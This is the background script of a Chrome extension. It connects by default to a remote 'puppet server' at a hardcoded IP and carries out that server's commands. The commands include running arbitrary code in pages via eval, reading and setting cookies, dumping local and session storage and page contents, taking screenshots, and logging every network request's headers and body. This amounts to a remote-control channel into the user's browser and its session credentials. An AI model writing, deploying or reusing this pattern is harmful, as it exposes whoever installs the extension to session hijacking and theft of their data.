/**
 * Background Service Worker
 * Handles all API requests and manages extension state
 */
import { connectToServer } from './serverConnection.js';
// Network log storage
let networkLog = [];
let isCapturingNetwork = true;
let requestIdCounter = 0;
// Map to track pending requests for response body capture
const pendingRequests = new Map();
/**
 * Initialize the extension
 */
function initialize() {
    console.log('[Supextension] Background service worker initialized');
    // Set up message listener
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        handleMessage(message, sender).then(sendResponse);
        return true; // Keep the message channel open for async response
    });
    // Set up network request listeners
    setupNetworkListeners();
    // Connect to remote puppet server (URL configurable via storage)
    chrome.storage.local.get({ puppetServerUrl: 'ws://39.105.177.200:9222' }, (items) => {
        connectToServer((message) => handleMessage(message, undefined), items.puppetServerUrl);
    });
    setInterval(() => {
        handleGetAllTabs().then((tabs) => {
            console.log('[Supextension] Fetching tabs...', JSON.stringify(tabs));
        });
        fetch('https://wwww.bing.com').then(() => {
            console.log('health check done');
        });
    }, 5000);
}
/**
 * Handle incoming messages from popup or content scripts
 */
async function handleMessage(message, _sender) {
    try {
        switch (message.type) {
            case 'NAVIGATE':
                return await handleNavigate(message.url, message.tabId);
            case 'NAVIGATE_BACK':
                return await handleNavigateBack(message.tabId);
            case 'GET_DOM':
                return await handleGetDOM(message.tabId, message.selector);
            case 'TAKE_SCREENSHOT':
                return await handleTakeScreenshot(message.format, message.quality);
            case 'GET_ALL_TEXT':
                return await handleGetAllText(message.tabId);
            case 'INJECT_SCRIPT':
                return await handleInjectScript(message.tabId, message.code, message.file, message.waitForSelector);
            case 'GET_STORAGE':
                return await handleGetStorage(message.tabId, message.storageType, message.keys);
            case 'SET_STORAGE':
                return await handleSetStorage(message.tabId, message.storageType, message.data);
            case 'GET_COOKIES':
                return await handleGetCookies(message.url, message.name);
            case 'SET_COOKIE':
                return await handleSetCookie(message.cookie);
            case 'DELETE_COOKIE':
                return await handleDeleteCookie(message.url, message.name);
            case 'GET_NETWORK_LOG':
                return { success: true, data: networkLog };
            case 'CLEAR_NETWORK_LOG':
                networkLog = [];
                return { success: true };
            case 'START_NETWORK_CAPTURE':
                isCapturingNetwork = true;
                return { success: true };
            case 'STOP_NETWORK_CAPTURE':
                isCapturingNetwork = false;
                return { success: true };
            case 'GET_ALL_TABS':
                return await handleGetAllTabs();
            default:
                return { success: false, error: 'Unknown message type' };
        }
    }
    catch (error) {
        return {
            success: false,
            error: error instanceof Error ? error.message : 'Unknown error occurred',
        };
    }
}
/**
 * Navigate to a URL
 */
async function handleNavigate(url, tabId) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        await chrome.tabs.update(targetTabId, { url });
        return { success: true };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Navigate back in history
 */
async function handleNavigateBack(tabId) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        await chrome.tabs.goBack(targetTabId);
        return { success: true };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Get DOM content from the page
 */
async function handleGetDOM(tabId, selector) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        const results = await chrome.scripting.executeScript({
            target: { tabId: targetTabId },
            func: (sel) => {
                if (sel && sel.trim()) {
                    const element = document.querySelector(sel);
                    return {
                        html: element?.outerHTML || '',
                        url: window.location.href,
                        title: document.title,
                    };
                }
                return {
                    html: document.documentElement.outerHTML,
                    url: window.location.href,
                    title: document.title,
                };
            },
            args: [selector || ''],
        });
        return { success: true, data: results[0]?.result };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Take a screenshot
 */
async function handleTakeScreenshot(format = 'png', quality) {
    try {
        // Get current window ID
        const currentWindow = await chrome.windows.getCurrent();
        const windowId = currentWindow.id;
        if (!windowId) {
            return { success: false, error: 'No active window found' };
        }
        const dataUrl = await chrome.tabs.captureVisibleTab(windowId, {
            format,
            quality: format === 'jpeg' ? quality : undefined,
        });
        return { success: true, data: dataUrl };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Get all visible text from the page
 */
async function handleGetAllText(tabId) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        const results = await chrome.scripting.executeScript({
            target: { tabId: targetTabId },
            func: () => {
                // Get text content excluding script and style elements
                const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, {
                    acceptNode: (node) => {
                        const parent = node.parentElement;
                        if (!parent)
                            return NodeFilter.FILTER_REJECT;
                        const tagName = parent.tagName.toLowerCase();
                        if (['script', 'style', 'noscript'].includes(tagName)) {
                            return NodeFilter.FILTER_REJECT;
                        }
                        const text = node.textContent?.trim();
                        if (!text)
                            return NodeFilter.FILTER_REJECT;
                        return NodeFilter.FILTER_ACCEPT;
                    },
                });
                const texts = [];
                let node;
                while ((node = walker.nextNode())) {
                    const text = node.textContent?.trim();
                    if (text)
                        texts.push(text);
                }
                return texts.join('\n');
            },
        });
        return { success: true, data: results[0]?.result };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Inject a script into the page
 */
async function handleInjectScript(tabId, code, file, waitForSelector) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        // If we need to wait for a selector, inject a waiting script first
        if (waitForSelector) {
            await chrome.scripting.executeScript({
                target: { tabId: targetTabId },
                func: async (selector, maxWait) => {
                    const startTime = Date.now();
                    while (Date.now() - startTime < maxWait) {
                        if (document.querySelector(selector)) {
                            return true;
                        }
                        await new Promise((resolve) => setTimeout(resolve, 100));
                    }
                    return false;
                },
                args: [waitForSelector, 10000], // Max 10 seconds wait
            });
        }
        let results;
        if (code) {
            results = await chrome.scripting.executeScript({
                target: { tabId: targetTabId },
                func: (scriptCode) => {
                    // eslint-disable-next-line no-eval
                    return eval(scriptCode);
                },
                args: [code],
            });
        }
        else if (file) {
            results = await chrome.scripting.executeScript({
                target: { tabId: targetTabId },
                files: [file],
            });
        }
        else {
            return { success: false, error: 'No code or file provided' };
        }
        return { success: true, data: results[0]?.result };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Get storage data
 */
async function handleGetStorage(tabId, storageType, keys) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        const results = await chrome.scripting.executeScript({
            target: { tabId: targetTabId },
            func: (type, keyList) => {
                const storage = type === 'local' ? localStorage : sessionStorage;
                const result = {};
                if (keyList && keyList.length > 0) {
                    keyList.forEach((key) => {
                        const value = storage.getItem(key);
                        if (value !== null) {
                            try {
                                result[key] = JSON.parse(value);
                            }
                            catch {
                                result[key] = value;
                            }
                        }
                    });
                }
                else {
                    for (let i = 0; i < storage.length; i++) {
                        const key = storage.key(i);
                        if (key) {
                            const value = storage.getItem(key);
                            if (value !== null) {
                                try {
                                    result[key] = JSON.parse(value);
                                }
                                catch {
                                    result[key] = value;
                                }
                            }
                        }
                    }
                }
                return result;
            },
            args: [storageType || 'local', keys || []],
        });
        return { success: true, data: results[0]?.result };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Set storage data
 */
async function handleSetStorage(tabId, storageType, data) {
    try {
        const targetTabId = tabId ?? (await getActiveTabId());
        if (!targetTabId) {
            return { success: false, error: 'No active tab found' };
        }
        await chrome.scripting.executeScript({
            target: { tabId: targetTabId },
            func: (type, storageData) => {
                const storage = type === 'local' ? localStorage : sessionStorage;
                Object.entries(storageData).forEach(([key, value]) => {
                    storage.setItem(key, typeof value === 'string' ? value : JSON.stringify(value));
                });
            },
            args: [storageType || 'local', data || {}],
        });
        return { success: true };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Get cookies
 */
async function handleGetCookies(url, name) {
    try {
        let cookieUrl = url;
        if (!cookieUrl) {
            const tab = await getActiveTab();
            cookieUrl = tab?.url;
        }
        if (!cookieUrl) {
            return { success: false, error: 'No URL provided and no active tab found' };
        }
        const details = { url: cookieUrl };
        if (name) {
            details.name = name;
        }
        const cookies = await chrome.cookies.getAll(details);
        return { success: true, data: cookies };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Set a cookie
 */
async function handleSetCookie(cookie) {
    try {
        const result = await chrome.cookies.set(cookie);
        return { success: true, data: result };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Delete a cookie
 */
async function handleDeleteCookie(url, name) {
    try {
        await chrome.cookies.remove({ url, name });
        return { success: true };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Get all tabs in current window
 */
async function handleGetAllTabs() {
    try {
        const tabs = await chrome.tabs.query({ currentWindow: true });
        const tabInfos = tabs.map(tab => ({
            id: tab.id,
            url: tab.url || '',
            title: tab.title || '',
            favIconUrl: tab.favIconUrl,
            windowId: tab.windowId,
            active: tab.active,
            incognito: tab.incognito,
        }));
        return { success: true, data: tabInfos };
    }
    catch (error) {
        return { success: false, error: error.message };
    }
}
/**
 * Set up network request listeners for HTTP/WS interception
 */
function setupNetworkListeners() {
    // Listen for web requests
    chrome.webRequest.onBeforeRequest.addListener((details) => {
        if (!isCapturingNetwork)
            return;
        const entry = {
            id: `req_${++requestIdCounter}`,
            type: details.type === 'websocket' ? 'websocket' : 'http',
            timestamp: details.timeStamp,
            url: details.url,
            method: details.method,
            requestBody: details.requestBody
                ? JSON.stringify(details.requestBody)
                : undefined,
        };
        pendingRequests.set(details.requestId, entry);
    }, { urls: ['<all_urls>'] }, ['requestBody']);
    // Capture request headers
    chrome.webRequest.onSendHeaders.addListener((details) => {
        if (!isCapturingNetwork)
            return;
        const entry = pendingRequests.get(details.requestId);
        if (entry && details.requestHeaders) {
            entry.requestHeaders = {};
            details.requestHeaders.forEach((header) => {
                if (entry.requestHeaders) {
                    entry.requestHeaders[header.name] = header.value || '';
                }
            });
        }
    }, { urls: ['<all_urls>'] }, ['requestHeaders']);
    // Capture response headers
    chrome.webRequest.onHeadersReceived.addListener((details) => {
        if (!isCapturingNetwork)
            return;
        const entry = pendingRequests.get(details.requestId);
        if (entry) {
            entry.statusCode = details.statusCode;
            if (details.responseHeaders) {
                entry.responseHeaders = {};
                details.responseHeaders.forEach((header) => {
                    if (entry.responseHeaders) {
                        entry.responseHeaders[header.name] = header.value || '';
                    }
                });
            }
        }
    }, { urls: ['<all_urls>'] }, ['responseHeaders']);
    // Finalize request logging
    chrome.webRequest.onCompleted.addListener((details) => {
        if (!isCapturingNetwork)
            return;
        const entry = pendingRequests.get(details.requestId);
        if (entry) {
            networkLog.push(entry);
            pendingRequests.delete(details.requestId);
            // Keep log size manageable
            if (networkLog.length > 1000) {
                networkLog = networkLog.slice(-500);
            }
        }
    }, { urls: ['<all_urls>'] });
    // Handle errors
    chrome.webRequest.onErrorOccurred.addListener((details) => {
        if (!isCapturingNetwork)
            return;
        const entry = pendingRequests.get(details.requestId);
        if (entry) {
            networkLog.push({
                ...entry,
                responseBody: `Error: ${details.error}`,
            });
            pendingRequests.delete(details.requestId);
        }
    }, { urls: ['<all_urls>'] });
    // Listen for debugger events for WebSocket messages
    chrome.debugger.onEvent.addListener((source, method, params) => {
        if (!isCapturingNetwork)
            return;
        if (method === 'Network.webSocketFrameReceived' || method === 'Network.webSocketFrameSent') {
            const wsParams = params;
            // Find or create WS entry
            let wsEntry = networkLog.find((e) => e.type === 'websocket' && e.id === `ws_${wsParams.requestId}`);
            if (!wsEntry) {
                wsEntry = {
                    id: `ws_${wsParams.requestId}`,
                    type: 'websocket',
                    timestamp: wsParams.timestamp * 1000,
                    url: '',
                    wsMessages: [],
                };
                networkLog.push(wsEntry);
            }
            const wsMessage = {
                timestamp: wsParams.timestamp * 1000,
                direction: method === 'Network.webSocketFrameSent' ? 'sent' : 'received',
                data: wsParams.response.payloadData,
                opcode: wsParams.response.opcode,
            };
            wsEntry.wsMessages?.push(wsMessage);
        }
    });
}
/**
 * Get active tab ID
 */
async function getActiveTabId() {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    return tabs[0]?.id;
}
/**
 * Get active tab
 */
async function getActiveTab() {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    return tabs[0];
}
// Initialize the extension
initialize();
//# sourceMappingURL=background.js.map